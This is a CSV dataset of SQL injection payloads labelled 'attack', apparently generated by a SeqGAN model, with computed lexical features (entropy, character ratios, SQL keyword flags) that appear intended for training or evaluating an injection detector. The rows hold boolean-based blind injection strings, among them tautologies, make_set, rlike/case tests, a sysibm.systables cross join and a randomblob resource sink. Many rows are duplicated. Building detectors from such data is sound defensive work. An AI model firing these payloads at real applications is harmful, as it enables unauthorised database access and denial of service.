label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-6846%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,268,146.0,35.0,3.520228594954345,35.0,18.0,68.0,25.0,0.23972602739726026,0.1232876712328767,0.4657534246575342,0.17123287671232876,2.0,4.0,1.0,1.0,0.0,2.0,0.0,12.0,2.0,0.0,1.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,269,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,270,77.0,19.0,2.907675354898644,5.0,16.0,40.0,16.0,0.06493506493506493,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,271,61.0,27.0,3.9439594785479564,12.0,16.0,20.0,13.0,0.19672131147540983,0.26229508196721313,0.32786885245901637,0.21311475409836064,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.0,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,272,77.0,19.0,2.907675354898644,5.0,16.0,40.0,16.0,0.06493506493506493,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2925%-""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,273,78.0,20.0,2.9790346059885513,5.0,16.0,40.0,17.0,0.0641025641025641,0.20512820512820512,0.5128205128205128,0.21794871794871795,0.0,4.0,2.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,274,61.0,27.0,3.9439594785479564,12.0,16.0,20.0,13.0,0.19672131147540983,0.26229508196721313,0.32786885245901637,0.21311475409836064,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.0,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,275,77.0,19.0,2.907675354898644,5.0,16.0,40.0,16.0,0.06493506493506493,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,276,107.0,27.0,3.5228911686215136,34.0,13.0,46.0,14.0,0.3177570093457944,0.12149532710280374,0.42990654205607476,0.1308411214953271,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,277,61.0,27.0,3.9439594785479564,12.0,16.0,20.0,13.0,0.19672131147540983,0.26229508196721313,0.32786885245901637,0.21311475409836064,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.0,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,278,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,279,71.0,24.0,3.526403143842483,12.0,16.0,28.0,15.0,0.16901408450704225,0.22535211267605634,0.39436619718309857,0.2112676056338028,0.0,4.0,1.0,0.0,0.0,2.0,0.0,4.0,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,280,77.0,19.0,2.907675354898644,5.0,16.0,40.0,16.0,0.06493506493506493,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,281,107.0,27.0,3.5228911686215136,34.0,13.0,46.0,14.0,0.3177570093457944,0.12149532710280374,0.42990654205607476,0.1308411214953271,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,282,61.0,28.0,4.00953324903976,12.0,16.0,20.0,13.0,0.19672131147540983,0.26229508196721313,0.32786885245901637,0.21311475409836064,2.0,2.0,1.0,0.0,0.0,2.0,0.0,2.0,2.0,1.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,283,142.0,32.0,3.390866762228991,35.0,15.0,68.0,24.0,0.24647887323943662,0.1056338028169014,0.4788732394366197,0.16901408450704225,2.0,4.0,0.0,1.0,0.0,2.0,0.0,12.0,2.0,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6846""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,284,76.0,19.0,2.870933285728956,5.0,16.0,40.0,15.0,0.06578947368421052,0.21052631578947367,0.5263157894736842,0.19736842105263158,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,1.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,285,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-2925%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,286,77.0,20.0,2.9434531146670007,5.0,16.0,40.0,16.0,0.06493506493506493,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,287,77.0,19.0,2.907675354898644,5.0,16.0,40.0,16.0,0.06493506493506493,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,288,142.0,32.0,3.390866762228991,35.0,15.0,68.0,24.0,0.24647887323943662,0.1056338028169014,0.4788732394366197,0.16901408450704225,2.0,4.0,0.0,1.0,0.0,2.0,0.0,12.0,2.0,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,289,61.0,27.0,3.9439594785479564,12.0,16.0,20.0,13.0,0.19672131147540983,0.26229508196721313,0.32786885245901637,0.21311475409836064,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.0,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,290,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,291,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,292,79.0,26.0,3.7517490416973542,18.0,21.0,29.0,11.0,0.22784810126582278,0.26582278481012656,0.3670886075949367,0.13924050632911392,2.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,0.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-2925%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,293,71.0,24.0,3.526403143842483,12.0,16.0,28.0,15.0,0.16901408450704225,0.22535211267605634,0.39436619718309857,0.2112676056338028,0.0,4.0,1.0,0.0,0.0,2.0,0.0,4.0,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,294,77.0,19.0,2.907675354898644,5.0,16.0,40.0,16.0,0.06493506493506493,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-1422%6846%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,295,18.0,10.0,3.169925001442312,0.0,8.0,4.0,6.0,0.0,0.4444444444444444,0.2222222222222222,0.3333333333333333,0.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,296,77.0,19.0,2.907675354898644,5.0,16.0,40.0,16.0,0.06493506493506493,0.2077922077922078,0.5194805194805194,0.2077922077922078,0.0,4.0,1.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,297,107.0,27.0,3.5228911686215136,34.0,13.0,46.0,14.0,0.3177570093457944,0.12149532710280374,0.42990654205607476,0.1308411214953271,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,298,61.0,27.0,3.9439594785479564,12.0,16.0,20.0,13.0,0.19672131147540983,0.26229508196721313,0.32786885245901637,0.21311475409836064,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.0,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,299,92.0,22.0,3.014506656744198,13.0,13.0,48.0,18.0,0.14130434782608695,0.14130434782608695,0.5217391304347826,0.1956521739130435,4.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,300,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
